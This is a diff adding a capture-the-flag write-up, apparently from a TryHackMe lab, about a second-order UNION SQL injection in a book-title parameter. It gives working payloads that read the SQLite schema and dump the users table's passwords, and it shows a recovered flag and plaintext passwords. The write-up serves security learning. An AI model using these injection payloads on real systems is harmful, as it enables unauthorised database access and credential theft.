@@ -483,7 +483,62 @@ Table: users
 
 
 
+---------------------------------------------------------------------------------------------------------------------------------------------
 
+
+
+
+<details>
+    <summary>Vulnerable Startup: Book Title 2</summary>
+
+
+- > in this challenge the query it take two union select
+  > ![image](https://github.com/user-attachments/assets/694bd1f1-c501-4b08-bc2c-a2733ebef701)
+  >
+  > so if i write ``10.10.216.224:5000/challenge7/book?title=' union select '1' -- -``
+  >
+  > i will see content of book that it's ``id=1``
+  > ![image](https://github.com/user-attachments/assets/4947ebae-0843-4456-a88a-04fecb47e3b3)
+  >
+  > now if i put :
+  >
+  > ```
+  > http://10.10.216.224:5000/challenge7/book?title=' union select '-1''union select 1,27,3,44-- -
+  > ```
+  > that will be the output
+  >
+  > ![image](https://github.com/user-attachments/assets/680c37e4-6fe1-4a55-9645-e5a43b0ad488)
+  
+<details>
+  <summary>know tables and ....</summary>
+
+```
+' union select '-1''union select 1,2,3,sql FROM sqlite_master WHERE name='users' AND type='table'-- -
+```
+   
+</details>
+
+
+
+- > 
+  > ### ``now get the passowrd``
+  >
+  > ```
+  > ' union select '-1''union select 1,2,3,group_concat(password) from users-- -
+  > ```
+  >
+  > found
+  >
+  > ``
+  > THM{183526c1843c09809695a9979a672f09},asd,Summer2019!,345m3io4hj3,viking123,123
+  > ``   
+
+
+
+
+
+   
+</details>
 
 
 
